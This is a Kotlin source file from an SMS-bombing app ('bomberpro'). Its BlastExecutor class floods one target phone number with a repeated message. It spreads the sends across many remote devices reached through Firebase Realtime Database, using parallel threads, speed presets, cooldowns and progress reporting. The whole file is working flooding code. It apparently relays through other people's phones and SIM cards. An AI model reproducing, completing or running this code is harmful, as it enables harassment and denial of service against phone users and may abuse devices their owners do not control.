package com.sanji.bomberpro.services

import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.sync.withPermit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import kotlin.math.min

sealed class BlastEvent {
    data class Started(val total: Int, val devices: Int) : BlastEvent()
    data class Progress(
        val sent: Int,
        val failed: Int,
        val total: Int,
        val ratePerSec: Double,
    ) : BlastEvent()
    data class Complete(
        val sent: Int,
        val failed: Int,
        val durationSec: Long,
        val cancelled: Boolean,
    ) : BlastEvent()
    data class Error(val message: String) : BlastEvent()
}

enum class BlastSpeed(val delayMs: Long, val label: String) {
    FAST(1, "FAST"),
    MEDIUM(50, "MEDIUM"),
    SLOW(200, "SLOW"),
}

class BlastExecutor(private val rtdb: RealtimeDbService) {

    /**
     * Execute a blast.
     * - Emits BlastEvent.Progress every ~500ms
     * - Honours per-device 0.25s cooldown
     * - Threads = parallel devices
     * - 3-attempt retry inside sendSms
     */
    fun execute(
        devices: List<Device>,
        target: String,
        message: String,
        count: Int,
        threads: Int,
        speed: BlastSpeed,
        cancelFlag: AtomicBoolean,
    ): Flow<BlastEvent> = callbackFlow {
        if (devices.isEmpty()) {
            trySend(BlastEvent.Error("No devices online"))
            close(); return@callbackFlow
        }
        if (count <= 0) {
            trySend(BlastEvent.Error("Count must be > 0"))
            close(); return@callbackFlow
        }

        val total = count
        val sent = AtomicInteger(0)
        val failed = AtomicInteger(0)
        val startedAt = System.currentTimeMillis()

        trySend(BlastEvent.Started(total, devices.size))

        val deviceCooldownMutex = Mutex()
        val deviceLastSend = mutableMapOf<String, Long>()

        val semaphore = Semaphore(min(threads.coerceAtLeast(1), devices.size))

        val progressJob = launch {
            while (isActive) {
                delay(500)
                val s = sent.get()
                val f = failed.get()
                val elapsed = (System.currentTimeMillis() - startedAt) / 1000.0
                val rate = if (elapsed > 0) (s + f) / elapsed else 0.0
                trySend(BlastEvent.Progress(s, f, total, rate))
                if (s + f >= total) break
            }
        }

        try {
            coroutineScope {
                val jobs = (0 until total).map { i ->
                    async {
                        if (cancelFlag.get() || sent.get() + failed.get() >= total) return@async

                        semaphore.withPermit {
                            if (cancelFlag.get()) return@withPermit

                            val device = devices[i % devices.size]

                            // cooldown 250ms per device (bot.py parity)
                            deviceCooldownMutex.withLock {
                                val now = System.currentTimeMillis()
                                val last = deviceLastSend[device.deviceId] ?: 0L
                                val wait = 250L - (now - last)
                                deviceLastSend[device.deviceId] = now + maxOf(0L, wait)
                                if (wait > 0) {
                                    // wait outside the lock
                                }
                            }
                            val last = deviceLastSend[device.deviceId] ?: 0L
                            val wait = last - System.currentTimeMillis() - speed.delayMs
                            if (wait > 0) delay(wait)

                            val sim = firstSimSlot(device)
                            val result = rtdb.sendSms(
                                firebaseUrl = device.firebaseUrl,
                                deviceId = device.deviceId,
                                simSlot = sim,
                                to = target,
                                message = message,
                            )

                            if (result.ok) sent.incrementAndGet() else failed.incrementAndGet()

                            if (speed.delayMs > 0) delay(speed.delayMs)
                        }
                    }
                }
                jobs.awaitAll()
            }

            progressJob.cancel()

            val duration = (System.currentTimeMillis() - startedAt) / 1000L
            trySend(
                BlastEvent.Complete(
                    sent = sent.get(),
                    failed = failed.get(),
                    durationSec = duration,
                    cancelled = cancelFlag.get(),
                )
            )
        } catch (e: Exception) {
            trySend(BlastEvent.Error(e.message ?: "Blast failed"))
        } finally {
            close()
        }

        awaitClose { cancelFlag.set(true) }
    }

    private fun firstSimSlot(device: Device): Int {
        val first = device.sims.firstOrNull() ?: return 0
        return (first["simSlotIndex"] as? Int) ?: 0
    }
}